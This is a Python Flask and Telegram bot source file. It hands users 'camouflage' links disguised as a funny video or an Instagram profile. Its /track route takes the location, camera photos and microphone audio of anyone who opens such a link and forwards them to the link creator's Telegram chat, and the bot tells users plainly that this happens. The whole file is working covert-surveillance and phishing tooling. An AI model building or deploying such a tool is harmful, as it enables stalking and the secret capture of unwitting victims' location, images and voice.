import os
import json
import base64
import tempfile
import requests
from flask import Flask, request, render_template, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from database import get_or_create_session, get_chat_id

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("BOT_TOKEN missing")

# Parse required channels from environment variable
REQUIRED_CHANNELS = []
channels_env = os.environ.get("REQUIRED_CHANNELS", "")
if channels_env:
    REQUIRED_CHANNELS = [ch.strip() for ch in channels_env.split(",") if ch.strip()]

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ---------- Helper Functions ----------
def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(f"{TG_API}/sendMessage", json=payload)

def answer_callback(callback_query_id, text=None):
    payload = {"callback_query_id": callback_query_id}
    if text:
        payload["text"] = text
    requests.post(f"{TG_API}/answerCallbackQuery", json=payload)

def edit_message_text(chat_id, message_id, text):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    requests.post(f"{TG_API}/editMessageText", json=payload)

def send_photo(chat_id, photo_path):
    with open(photo_path, "rb") as f:
        requests.post(f"{TG_API}/sendPhoto", data={"chat_id": chat_id}, files={"photo": f})

def send_audio(chat_id, audio_path):
    with open(audio_path, "rb") as f:
        requests.post(f"{TG_API}/sendAudio", data={"chat_id": chat_id}, files={"audio": f})

def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat = content["lat"]
        lon = content["lon"]
        acc = content["acc"]
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        send_message(
            chat_id,
            f"📍 <b>Location</b>\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}m\n\n🗺️ <a href='{maps_link}'>Open in Google Maps</a>"
        )
    elif data_type == "photo":
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(img_data)
            tmp = f.name
        send_photo(chat_id, tmp)
        os.unlink(tmp)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
            f.write(audio_data)
            tmp = f.name
        send_audio(chat_id, tmp)
        os.unlink(tmp)

# ---------- Force Join Channel Check ----------
def check_membership(chat_id):
    """Check if user has joined all required channels. Returns list of missing channels."""
    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            url = f"{TG_API}/getChatMember"
            params = {"chat_id": channel, "user_id": chat_id}
            resp = requests.get(url, params=params)
            data = resp.json()
            if data.get("ok"):
                status = data["result"]["status"]
                # status can be: "creator", "administrator", "member", "restricted", "left", "kicked"
                if status not in ["creator", "administrator", "member"]:
                    missing.append(channel)
            else:
                # Bot may not be admin or channel doesn't exist
                # Treat as missing to be safe
                missing.append(channel)
        except Exception as e:
            print(f"Error checking membership for {channel}: {e}")
            missing.append(channel)
    return missing

# ---------- Flask Routes ----------
@app.route('/camouflage')
def camouflage():
    session_id = request.args.get('session')
    template = request.args.get('template', 'funny')
    if not session_id or not get_chat_id(session_id):
        return "Invalid or expired link", 404
    if template not in ['funny', 'instagram']:
        template = 'funny'
    return render_template(f'{template}.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400
    data = request.get_json()
    if data and 'location' in data:
        send_to_telegram(chat_id, "location", data['location'])
    elif data and 'image' in data:
        send_to_telegram(chat_id, "photo", data['image'])
    elif data and 'audio' in data:
        send_to_telegram(chat_id, "audio", data['audio'])
    return jsonify({"status": "ok"})

# ---------- Telegram Webhook ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data(as_text=True)
    try:
        update = Update.de_json(json.loads(json_str), None)
        if update.message and update.message.text and update.message.text.startswith('/start'):
            chat_id = update.message.chat.id

            # Check channel membership first
            if REQUIRED_CHANNELS:
                missing = check_membership(chat_id)
                if missing:
                    # Build inline keyboard with join links
                    buttons = []
                    for ch in missing:
                        # Create link: https://t.me/username
                        join_link = f"https://t.me/{ch}"
                        buttons.append([InlineKeyboardButton(f"📢 Join @{ch}", url=join_link)])
                    # Add a "I have joined" button to re-check
                    buttons.append([InlineKeyboardButton("✅ I have joined", callback_data="check_join")])
                    reply_markup = InlineKeyboardMarkup(buttons)
                    send_message(
                        chat_id,
                        "⚠️ Please join the following channels/groups first to use this bot:\n\n"
                        "After joining, click 'I have joined' below.",
                        reply_markup=reply_markup
                    )
                    return "ok"

            # If all joined, proceed with normal flow
            keyboard = {
                "inline_keyboard": [
                    [{"text": "😂 Funny Video Link", "callback_data": "funny"}],
                    [{"text": "📸 Instagram Profile Link", "callback_data": "instagram"}]
                ]
            }
            send_message(chat_id, "🔗 Kaunsa link chahiye? Choose one:", reply_markup=keyboard)

        elif update.callback_query:
            query = update.callback_query
            query_id = query.id
            chat_id = query.message.chat.id
            message_id = query.message.message_id
            data = query.data

            # Handle "I have joined" button
            if data == "check_join":
                answer_callback(query_id, "Checking...")
                missing = check_membership(chat_id)
                if missing:
                    # Still missing, show again
                    buttons = []
                    for ch in missing:
                        join_link = f"https://t.me/{ch}"
                        buttons.append([InlineKeyboardButton(f"📢 Join @{ch}", url=join_link)])
                    buttons.append([InlineKeyboardButton("✅ I have joined", callback_data="check_join")])
                    reply_markup = InlineKeyboardMarkup(buttons)
                    edit_message_text(
                        chat_id,
                        message_id,
                        "⚠️ You still haven't joined all required channels. Please join below:",
                        reply_markup=reply_markup
                    )
                else:
                    # All joined, show main menu
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "😂 Funny Video Link", "callback_data": "funny"}],
                            [{"text": "📸 Instagram Profile Link", "callback_data": "instagram"}]
                        ]
                    }
                    edit_message_text(
                        chat_id,
                        message_id,
                        "✅ Thanks! Now choose your link:",
                        reply_markup=keyboard
                    )
                return "ok"

            # Handle template selection
            template = data
            answer_callback(query_id)
            session_id = get_or_create_session(chat_id)
            public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
            link = f"{public_url}/camouflage?session={session_id}&template={template}"
            edit_message_text(
                chat_id,
                message_id,
                f"✅ Your permanent link is ready:\n\n{link}\n\nShare this link. Anyone opening it will send location, photo & audio here."
            )
        return "ok"
    except Exception as e:
        print(f"Webhook error: {e}")
        return "error", 500

# ---------- Set Webhook ----------
def set_webhook():
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
    webhook_url = f"{public_url}/webhook"
    r = requests.post(f"{TG_API}/setWebhook", json={"url": webhook_url})
    print(f"Webhook set: {r.text}")

set_webhook()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
